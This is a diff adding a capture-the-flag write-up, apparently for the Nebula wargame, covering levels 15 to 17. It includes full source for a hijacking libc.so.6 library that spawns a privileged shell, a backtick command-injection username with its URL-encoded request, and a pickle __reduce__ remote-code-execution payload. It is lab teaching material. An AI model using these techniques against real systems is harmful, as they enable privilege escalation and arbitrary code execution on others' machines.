@@ -168,4 +168,100 @@ After that I logged into flag14 to make sure it was the correct token and indeed
 it was.
 
 #Level15
+In this level we have a program that prompts us to strace it. When I used strace on it,
+I saw that it tries to open a file at the path "/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6"
+and then it goes up in the directory tree and looks for the same file (for example
+at "/var/tmp/flag15/tls/i686/sse2/libc.so.6", and then at "/var/tmp/flag15/tls/i686", etc.)
+I figured that it tries to include a shared library so I wrote one where the function
+write() just executes a shell and compiled it to that path and run the program.
+At first, I received an error saying that the symbol for __cxa_finalize 
+is missing so I added it as a void function and recompiled. After that I got another
+error message saying that __libc_start_main is missing so I added it with its signature
+and made it run s shell as well (for good measure). After that I received an error
+saying that there's no symbol for the system() function so I compiled it statically.
+After that it said that it "cannot find -lgcc_s" so I added told it to statically
+compile it with libgcc. After that the error was that there was an incompatibility
+with the versions so I had to add a version script with the following content:
+	GLIBC_2.0{
+	};
+and I compiled with the following line:
+	gcc -fPIC -shared -static-libgcc -Wl,-static,-version-script=version so.c -o /var/tmp/flag15/libc.so.6
+and the so.c file contained this:
+
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <sys/types.h>
+
+	int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+	{
+	    gid_t gid = getegid();
+	    uid_t uid = geteuid();
+	    setresgid(gid,gid,gid); setresuid(uid,uid,uid);
+	    system("/bin/bash");
+	    return 0;
+	}
+
+	void __cxa_finalize()
+	{
+	    return;
+	}
+
+	ssize_t write(int fd, const void *buf, size_t count)
+	{
+	    gid_t gid = getegid();
+	    uid_t uid = geteuid();
+	    setresgid(gid,gid,gid); setresuid(uid,uid,uid);
+	    system("/bin/bash");
+	    return 0;
+	}
+After that I executed the flag15 program and received a shell with flag15 privileges.
+I executed getflag and it ran successfully.
+
+# Level16
+In this level we have a Perl CGI script listening on port 1616 that receives two parameters:
+a username and a password. It takes the username, converts it to uppercase and strips everything
+after the first space it sees, F.E:
+	"abc def geh" -> "ABC"
+After that it formats it to the following string and evaluates it:
+	`egrep "^$username" ./userdb.txt 2>&1`
+If it finds a match it splits the line and compares the user's password to it.
+If there's a match then the user is "logged in" and if not he isn't.
+The vulnerability in the script is that you can put backticks (`) in the username 
+you could execute commands. The limitations we need to bypass are the fact that the
+username is converted to upper case and that our command can't have a space in it.
+In order to bypass the space limitation I created a script at /tmp/123 with the following content:
+
+	#!/bin/sh
+	getflag > /home/flag16/level16_result
+
+The only problem is that I can't just call /tmp/123 because it is converted to uppercase
+and there's no such directory called /TMP.
+In order to bypass that I used wildcards (* for general and ? for single-character).
+The username I entered looked like this:
+	username=`/???/123`
+After that I URL-encoded all of it and the final query was this:
+	http://127.0.0.1:1616/index.cgi?username=%60%2F%3F%3F%3F%2F123%60
+I user wget and after the request I looked at /home/flag16/level16_result and
+it said that I executed getflag successfully.
+
+# Level17
+
+In this level we have a Python script listening at port 10007. The script receives
+a Pickled python object, de-serializes it and prints it. The vulnerability is that
+the program de-serializes user input without sanitizing or checking what the object is,
+which allows for object injection which leads to RCE. The way to execute code is 
+by sending an object that has our desired code to execute in the __reduce__ function.
+My injected object looked like this:
+
+	class Exploit(object):
+	    def __reduce__(self):
+		return (os.system, ('getflag > /tmp/level17_test',))
+
+I wrote a python script to send a pickled version of this object (a different file)
+and when I sent the object it caused an error because my function returned an int
+and the script tried to iterate over it but it doesn't matter, my code still ran and
+when I checked for the file /tmp/level17_test I saw that getflag ran successfully.
+
+# Level18
+
 
